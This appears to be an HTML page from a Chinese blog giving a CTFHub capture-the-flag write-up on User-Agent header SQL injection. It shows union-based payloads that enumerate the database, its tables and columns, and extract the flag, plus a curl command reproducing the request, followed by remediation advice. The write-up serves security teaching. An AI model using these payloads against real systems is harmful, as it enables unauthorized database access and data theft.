@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub UA注入 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - UA注入</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># UA注入</span>
+            <span class="tag"># UNION注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>UA注入</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>从 User-Agent 注入点读取数据库中的 flag。</li>
+        </ul>
+
+        <h2>二、定位注入点</h2>
+        <p>首次访问页面时，服务端直接提示输入点在 <code>User-Agent</code>，并回显默认请求对应的 SQL：</p>
+        <pre>select * from news where id=curl/8.21.0</pre>
+        <p>将 User-Agent 改为 <code>1</code> 后，查询语句和结果同步变化：</p>
+        <pre>User-Agent: 1
+
+select * from news where id=1
+ID: 1
+Data: ctfhub</pre>
+        <p>这说明 User-Agent 的值未经处理便进入了 SQL 查询，且 <code>id</code> 两侧没有引号，属于数字型注入。</p>
+        <p class="note">User-Agent 虽然是 HTTP 请求头，但同样完全由客户端控制。服务端将其视为可信数据并拼接 SQL，就会形成 UA 注入。</p>
+
+        <h2>三、确定回显列数</h2>
+        <p>原查询返回 <code>id</code> 和内容两列。使用不存在的负数 <code>-1</code> 避免优先返回原记录，再通过 UNION 放置两个测试值：</p>
+        <pre>User-Agent: -1 union select 111,222
+
+select * from news where id=-1 union select 111,222
+ID: 111
+Data: 222</pre>
+        <p>两个列位均成功回显，可确认查询共有两列。</p>
+
+        <h2>四、获取数据库基本信息</h2>
+        <pre>User-Agent: -1 union select database(),user()
+
+ID: sqli
+Data: root@localhost</pre>
+        <pre>User-Agent: -1 union select version(),@@version_compile_os
+
+ID: 10.3.22-MariaDB-0+deb10u1
+Data: debian-linux-gnu</pre>
+        <p>目标数据库为 <code>sqli</code>，数据库类型为 MariaDB。下一步通过 <code>information_schema</code> 枚举表名和字段名。</p>
+
+        <h2>五、枚举表和字段</h2>
+        <p>查询当前数据库中的全部表名：</p>
+        <pre>User-Agent: -1 union select 1,group_concat(table_name)
+from information_schema.tables
+where table_schema=database()
+
+ID: 1
+Data: news,meavyzbvxv</pre>
+        <p>除业务表 <code>news</code> 外，还存在随机表名 <code>meavyzbvxv</code>。继续查询该表的字段：</p>
+        <pre>User-Agent: -1 union select 1,group_concat(column_name)
+from information_schema.columns
+where table_schema=database()
+and table_name='meavyzbvxv'
+
+ID: 1
+Data: zxspefkdzi</pre>
+        <p>目标数据位于 <code>meavyzbvxv.zxspefkdzi</code>。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。</p>
+
+        <h2>六、读取 Flag</h2>
+        <pre>User-Agent: -1 union select 1,zxspefkdzi
+from meavyzbvxv
+
+ID: 1
+Data: ctfhub{052ccd06a44702cbf9c727c0}</pre>
+        <p>使用 <code>curl</code> 复现完整请求：</p>
+        <pre>curl.exe -sS -A "-1 union select 1,zxspefkdzi from meavyzbvxv" "http://&lt;target&gt;/"</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{052ccd06a44702cbf9c727c0}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将 User-Agent 等请求头直接拼接进 SQL。</li>
+            <li>对参与查询的字段执行严格的整数类型校验，只接受合法数字。</li>
+            <li>生产环境关闭 SQL 语句回显和详细数据库错误信息。</li>
+            <li>数据库账号遵循最小权限原则，限制对 <code>information_schema</code> 和业务表的访问。</li>
+            <li>所有 HTTP 输入都应视为不可信数据，包括 URL、Cookie、请求头和请求体。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>本题与 Cookie 注入的思路一致，只是注入位置变成了 User-Agent。确认请求头被直接拼接到 SQL 后，可沿用数字型注入流程：用 <code>-1</code> 避开原记录并验证 UNION 回显列，枚举当前数据库结构，最后读取目标字段。</p>
+    </div>
+</body>
+</html>
